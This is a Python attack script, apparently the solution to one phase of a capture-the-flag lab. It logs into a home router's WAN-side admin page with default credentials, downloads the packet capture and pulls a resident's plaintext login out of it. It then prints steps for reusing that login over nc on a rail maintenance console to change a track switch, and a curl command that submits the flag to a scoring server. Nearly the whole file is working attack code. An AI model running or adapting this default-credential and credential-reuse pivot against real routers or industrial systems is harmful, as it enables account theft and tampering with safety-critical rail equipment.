#!/usr/bin/env python3
"""SOHO router pivot (Phase 5b): residential -> rail.

    soho_pcap.py            # log into the router, pull the capture, read the login

A house on the edge of town runs a consumer router with WAN-side admin still on
the shipped default. Its Diagnostics page will hand you a decoded capture of the
home LAN, where the resident (a rail engineer) signs in to a crew portal over
plain HTTP on a loop. The credential in that capture is reused on the rail
maintenance console (rail-plc:2323) - so this is the classic remote-worker
SOHO -> OT pivot.
"""
from __future__ import annotations

import re
import sys
import urllib.parse
import urllib.request

sys.path.insert(0, "/opt/pktr/scripts")
from targets import guard  # noqa: E402

ROUTER = "soho-router"
ADMIN_USER, ADMIN_PASS = "admin", "admin"
FLAG_RE = re.compile(r"PKTR\{[A-Za-z0-9_]+\}")
CRED_RE = re.compile(r"user=([^&\s]+)&pass=([^&\s\n]+)")


def main():
    guard(ROUTER)
    base = f"http://{ROUTER}"

    # 1. default creds on the WAN-side admin
    body = urllib.parse.urlencode({"user": ADMIN_USER, "pass": ADMIN_PASS}).encode()
    op = urllib.request.build_opener(urllib.request.HTTPCookieProcessor())
    try:
        op.open(f"{base}/login", data=body, timeout=6).read()
    except OSError as exc:
        sys.exit(f"[soho] router login failed: {exc}")
    print(f"[soho] logged into {ROUTER} as {ADMIN_USER}/{ADMIN_PASS}")

    # 2. the diagnostics packet capture, decoded
    try:
        dump = op.open(f"{base}/admin/diag/capture?format=raw", timeout=6).read().decode()
    except OSError as exc:
        sys.exit(f"[soho] capture fetch failed: {exc}")

    flag = FLAG_RE.search(dump)
    cred = CRED_RE.search(dump)
    if cred:
        print(f"[soho] sniffed the crew-portal login: {cred.group(1)} / {cred.group(2)}")
        print("       reuse it:  nc rail-plc 2323  ->  login "
              f"{cred.group(1)} {cred.group(2)}  ->  flag / set switch spur")
    if not flag:
        print("\n--- capture ---\n" + dump)
        sys.exit("[soho] no flag in the capture yet - give the resident a few seconds and retry")
    print(f"\n[soho] flag from the capture:\n  {flag.group(0)}\n")
    print("submit it:  curl -s -X POST http://scoring:8001/api/score/submit "
          "-H 'Content-Type: application/json' -b /tmp/sc -d '{\"flag\":\""
          + flag.group(0) + "\"}'")


if __name__ == "__main__":
    main()
